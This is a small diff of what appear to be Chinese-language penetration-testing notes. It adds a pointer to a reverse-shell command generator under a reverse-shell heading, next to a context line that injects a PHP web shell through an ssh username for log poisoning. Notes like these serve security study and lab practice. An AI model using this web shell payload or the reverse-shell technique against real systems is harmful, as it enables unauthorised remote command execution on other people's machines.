@@ -59,6 +59,12 @@ ssh '<?php @eval($_REQUEST['cmd']);?>'@ip
 
 #### 反弹shell
 
+这个网站可以生成
+
+https://www.revshells.com/
+
+
+
 这里写的是攻击机ip
 
 ###### netcat反弹
